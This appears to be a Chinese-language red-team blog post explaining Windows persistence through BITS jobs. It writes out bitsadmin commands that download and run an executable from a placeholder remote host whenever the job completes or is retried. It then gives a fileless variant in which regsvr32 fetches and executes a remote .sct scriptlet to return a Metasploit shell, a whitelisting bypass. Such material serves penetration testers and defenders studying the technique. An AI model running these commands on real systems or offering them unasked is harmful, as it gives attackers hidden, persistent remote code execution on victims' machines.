---
layout:     post
title:    Windows权限维持-BITS
subtitle:   Windows权限维持-BITS
date:       2019-11-29
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 红队
    - 内网渗透
    - 权限维持
---
# Windows权限维持-BITS

### 简介
之前在下载payload中使用过BITS，BITS（后台智能传送服务），它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。Winodws提供了一个名为“bitsadmin”的工具，用于创建和管理文件传输。这里主要讲一下BITS在权限维持中的使用。    

### BITS使用
详细的可以查看官方文档，这里只是粗略的讲一下。  [文档地址](https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/bitsadmin-examples)  
分成5步：  
```
C:\>bitsadmin /create back
C:\>bitsadmin /addfile back "http://xxx.xxx.xxx.xxx/1.exe" "C:\tmp\1.exe"
C:\>bitsadmin /SetNotifyCmdLine back C:\tmp\1.exe NULL
C:\>bitsadmin /SetMinRetryDelay "back" 60
C:\>bitsadmin /resume back
```
1.创建名为back的传输作业。  
2.将远程的文件添加到back作业。  
3.在传输完成或者作业进入状态时，运行命令。  
4.设置遇到错误时最小等待时间（回调时间，单位秒）。 
5.激活队列中指定的作业。  
在cmd中执行后：  
![191129_1](/img/191129_bits1.png)  
![191129_2](/img/191129_bits2.png)  
然后会在对应目录直接多个tmp文件。  
![191129_3](/img/191129_tmp.png)  
然后查看下作业是否在队列中：  
![191129_4](/img/191129_bitslist.png)  
当然这样做有点不好的地方，会导致文件的落地。  

### BITS配合regsvr32
很多时候文件是被监控的，可以尝试使用regsvr32进行白名单执行payload，且文件是不落地的。  
开启msf进行监听配置：  
![191129_5](/img/191129_regsvrmsf.png)  
然后在cmd中运行:
```
C:\>bitsadmin /SetNotifyCmdLine back regsvr32 /s /n /u /i:http://xxx.xxx.xxx.xxx/VQbkeE0ijQ586bl.sct scrobj.dll
```
再重新激活作业。  
就可以在msf端接收到反弹，我这里不知道为什么又和之前一样崩了。  
![191129_6](/img/191129_msf.png)   

### 总结
白名单运行程序不仅仅只有regsvr32，还有别的很多，可以去查下资料。  